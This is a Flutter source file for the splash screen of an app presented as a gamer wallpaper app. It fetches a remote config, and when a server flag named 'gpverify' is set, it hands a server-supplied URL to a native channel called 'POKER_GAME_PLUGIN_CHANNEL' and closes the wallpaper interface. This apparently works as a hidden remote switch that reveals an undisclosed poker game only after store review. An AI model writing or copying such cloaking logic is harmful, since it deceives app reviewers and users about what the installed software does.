import 'dart:convert';

import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_screenutil/screenutil.dart';
import 'package:gamewallpaper/common/common.dart';
import 'package:gamewallpaper/component/styles.dart';
import 'package:gamewallpaper/net/repository.dart';

import 'list.dart';

class SplashPage extends StatefulWidget{
  _SplashPageState createState() => _SplashPageState();
}

class _SplashPageState extends State<SplashPage>{
  int controllVersion;
  int controllState;
  String url;
  String appUrl;
  String versionName;
  String releaseContent;

  MethodChannel _methodChannel = MethodChannel('POKER_GAME_PLUGIN_CHANNEL');
  EventChannel _eventChannel = EventChannel('POKER_GAME_PLUGIN_EVENT');
  _loadControll() async {
    Repository.fetchVersionControll().then((onValue) {
      var operation = json.decode(onValue.operation);
      setState(() {
        url = operation["url"];
      });
       //app的code
      operation["gpverify"].keys.forEach((item) {
        setState(() {
          controllVersion = int.parse(item); //传过来的appcode
          controllState = operation["gpverify"][item]; //传过来的状态
        });

      });

      _eventChannel.receiveBroadcastStream().listen((event) {
        SystemNavigator.pop();
      });
      _goToControllPage();
    }).catchError((onError) {
      print("onError:$onError");
      Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) {
        return ListPage();
      }));
    });
  }
  _goToControllPage() async {
    print(globalJqVersionCode < controllVersion &&
        controllState == 1);
    if (globalJqVersionCode < controllVersion &&
        controllState == 1) {
      _methodChannel.invokeMethod('game', {'url': url});
      Navigator.pop(context);
    } else {
      Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) {
        return ListPage();
      }));
    }
  }



  @override
  void initState() {
    // TODO: implement initState
    super.initState();
    _loadControll();
  }
  @override
  Widget build(BuildContext context) {
    ScreenUtil.init(context, width: 750, height: 1334, allowFontScaling: true);
    // TODO: implement build
    return Scaffold(
      body: Container(
        decoration: BoxDecoration(
            color: Colors.white,
            image: DecorationImage(
              image: AssetImage("assets/images/bg.png"),
              fit: BoxFit.cover,
            )),
        child: Center(
          child: Column(
            children: <Widget>[
              Gaps.vGap(350),
              Image.asset('assets/images/logo.png',width: ScreenUtil().setWidth(200),),
              Gaps.vGap(50),
              Text('Gamer Wallpaper-HD',style: TextStyle(
                fontSize: ScreenUtil().setSp(36)
              ),),
              Gaps.vGap(10),
              Text('& QHD Backgrounds for Game Fans',style: TextStyle(
                fontSize: ScreenUtil().setSp(36)
              ),)
            ],
          ),
        ),
      ),
    );
  }


}